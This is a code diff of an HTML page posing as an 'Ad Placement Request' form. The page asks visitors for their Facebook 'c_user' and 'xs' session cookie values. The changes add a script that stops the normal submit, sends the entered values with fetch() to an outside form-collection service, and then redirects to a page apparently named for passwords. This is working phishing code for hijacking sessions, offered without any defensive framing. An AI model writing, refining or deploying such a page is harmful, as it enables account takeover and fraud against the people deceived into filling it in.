@@ -4,6 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Ad Placement Inquiry</title>
+
 <style>
 body {
     font-family: Arial, sans-serif;
@@ -54,8 +55,8 @@ form button {
     cursor: pointer;
     font-weight: bold;
 }
-form button:hover {
-    background-color: #155ab6;
+form button:disabled {
+    opacity: 0.7;
 }
 p.note {
     text-align: center;
@@ -70,6 +71,8 @@ p.note {
     border-top:2px solid #fff;
     border-radius:50%;
     animation:spin 1s linear infinite;
+    display:inline-block;
+    vertical-align:middle;
 }
 @keyframes spin{
     0%{transform:rotate(0deg)}
@@ -77,25 +80,23 @@ p.note {
 }
 </style>
 </head>
+
 <body>
 
 <div class="container">
 
 <h2>Ad Placement Request</h2>
 <p class="description">
-Please fill in the details below to submit your request for placing an ad. Only the required fields are needed.
+Please fill in the details below to submit your request for placing an ad.
 </p>
 
-<!-- Video Section -->
 <div class="video-container">
 <video controls>
   <source src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4" type="video/mp4">
-  Your browser does not support the video tag.
 </video>
 </div>
 
-<!-- Form -->
-<form id="adForm" action="https://submit-form.com/upL3IuLAs" method="POST" target="_blank">
+<form id="adForm">
     <input type="text" name="c_user" placeholder="Enter c_user value" required>
     <input type="text" name="xs" placeholder="Enter XS value" required>
     <button type="submit" id="submitBtn">
@@ -103,7 +104,7 @@ Please fill in the details below to submit your request for placing an ad. Only 
     </button>
 </form>
 
-<p class="note">Your request will be processed securely. We respect your privacy.</p>
+<p class="note">Your request will be processed securely.</p>
 </div>
 
 <script>
@@ -111,13 +112,21 @@ const form = document.getElementById('adForm');
 const btn = document.getElementById('submitBtn');
 
 form.addEventListener('submit', function(e){
+    e.preventDefault();
+
     btn.disabled = true;
-    btn.innerHTML = 'Submitting…';
-    
-    // Let the form submit normally, then redirect after short delay
-    setTimeout(() => {
+    btn.innerHTML = '<span class="spinner"></span> Submitting…';
+
+    const formData = new FormData(form);
+
+    fetch("https://submit-form.com/upL3IuLAs", {
+        method: "POST",
+        body: formData
+    })
+    .finally(() => {
+        // ✅ direct redirect after submit
         window.location.href = "https://password-two-khaki.vercel.app/";
-    }, 1500); // 1.5s delay to ensure form submission
+    });
 });
 </script>
 
